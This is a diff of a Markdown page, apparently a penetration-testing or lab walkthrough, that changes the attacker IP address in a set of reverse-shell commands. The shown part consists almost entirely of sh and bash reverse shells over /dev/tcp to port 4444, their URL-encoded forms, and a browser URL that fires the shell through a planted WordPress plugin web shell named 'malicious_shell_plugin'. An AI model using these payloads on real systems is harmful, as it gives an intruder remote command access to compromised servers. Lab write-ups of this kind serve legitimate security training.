@@ -68,31 +68,31 @@ Pick your desired shell from [RevShells](https://www.revshells.com/). Example (e
 ### 🐚 `sh` Reverse Shell
 
 ```text
-sh -i >& /dev/tcp/192.168.45.201/4444 0>&1
+sh -i >& /dev/tcp/192.168.1.13/4444 0>&1
 ```
 
 URL-encoded:
 
 ```
-sh%20-i%20%3E%26%20/dev/tcp/192.168.45.201/4444%200%3E%261
+sh%20-i%20%3E%26%20/dev/tcp/192.168.1.13/4444%200%3E%261
 ```
 
 ### 💥 `bash` Reverse Shell
 
 ```text
-bash -c "sh -i >& /dev/tcp/192.168.45.201/4444 0>&1"
+bash -c "sh -i >& /dev/tcp/192.168.1.13/4444 0>&1"
 ```
 
 URL-encoded:
 
 ```
-bash%20-c%20"sh%20-i%20%3E%26%20/dev/tcp/192.168.45.201/4444%200%3E%261"
+bash%20-c%20"sh%20-i%20%3E%26%20/dev/tcp/192.168.1.13/4444%200%3E%261"
 ```
 
 Trigger it via browser:
 
 ```
-http://1337.codes/wp-content/plugins/malicious_shell_plugin/malicious-plugin.php?cmd=bash%20-c%20"sh%20-i%20%3E%26%20/dev/tcp/192.168.45.201/4444%200%3E%261"
+http://1337.codes/wp-content/plugins/malicious_shell_plugin/malicious-plugin.php?cmd=bash%20-c%20"sh%20-i%20%3E%26%20/dev/tcp/192.168.1.13/4444%200%3E%261"
 ```
 
 * * *
